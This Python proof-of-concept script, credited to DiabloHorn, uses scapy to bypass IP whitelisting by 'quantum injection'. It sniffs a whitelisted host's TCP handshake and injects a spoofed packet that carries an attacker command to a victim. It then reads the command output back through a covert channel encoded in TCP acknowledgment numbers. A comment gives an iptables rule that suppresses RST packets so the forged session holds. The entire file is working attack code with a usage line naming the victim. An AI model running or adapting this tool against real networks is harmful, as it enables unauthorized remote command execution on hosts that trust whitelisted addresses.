#!/usr/bin/env python
# DiabloHorn - QIBA_server_poc
# Bypassing IP whitelisting using quantum inject
import sys
import time
import socket
import collections
from scapy.all import *

"""
iptables -A OUTPUT -p tcp --tcp-flags RST RST -s <ip> -j DROP
"""
STATE_TEMP = []
CMD_DATA = collections.OrderedDict()

def pkt_inspect(pktdata):
    #print repr(pktdata)
    if pktdata.haslayer(TCP):
        tcpdata = pktdata.getlayer(TCP)
        #check if syn and ack flags are set
        if ((tcpdata.flags >> 1) & 1) and ((tcpdata.flags >> 4) & 1):
            if len(STATE_TEMP) == 2:
                spkt = IP(src=sys.argv[1],dst=sys.argv[2]) / TCP(dport=STATE_TEMP[0].dport,sport=int(sys.argv[3]),flags='PA',seq=STATE_TEMP[1].ack-1,ack=STATE_TEMP[0].ack-1) / (sys.argv[4] + ':' + 'a'*(100-(len(sys.argv[4])+1)))
                print 'Injecting::::::: %s' % repr(spkt)
                #print repr(spkt)
                send(spkt)

            if len(STATE_TEMP) == 1:
                if STATE_TEMP[0].ack != tcpdata.ack:
                    STATE_TEMP.append(tcpdata)
            else:
                STATE_TEMP.append(tcpdata)

def stopcheck(pktdata):
    if pktdata.haslayer(TCP):
        tcpdata = pktdata.getlayer(TCP)
        if tcpdata.ack == 1 and tcpdata.dport == 31337:
            return True
    else:
        return False

def data_recv(pktdata):
    global CMD_DATA
    if pktdata.haslayer(TCP):
        #print pktdata.getlayer(TCP).ack-1
        try:
            encdata = '{:02x}'.format(pktdata.getlayer(TCP).ack-1).decode('hex')
            if ((ord(encdata[0]) + ord(encdata[1]) + ord(encdata[2])) % 0xff) == ord(encdata[3]):
                print "cmdoutput::::::: %s" % encdata[0:3]
                CMD_DATA[pktdata.getlayer(TCP).seq] = encdata[0:3]
        except TypeError:
            pass
        except IndexError:
            pass

def stopdatarecv(pktdata):
    if pktdata.haslayer(TCP):
        try:
            encdata = '{:02x}'.format(pktdata.getlayer(TCP).ack-1).decode('hex')
            #print encdata
            if encdata == "STOP":
                return True
            else:
                return False
        except TypeError:
            pass
        except IndexError:
            pass

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print "{} <whitelisted ip> <victim ip> <whitelisted port> <cmd>".format(sys.argv[0])
        sys.exit()

    sniff(iface="eth0",store=0,prn=pkt_inspect,filter="ip and host {}".format(sys.argv[1]), stop_filter=stopcheck)

    sniff(iface="eth0",store=0,prn=data_recv,filter="ip and host {}".format(sys.argv[1]), stop_filter=stopdatarecv)
    finalout = ''
    for k,v in CMD_DATA.iteritems():
        finalout += v
    print finalout
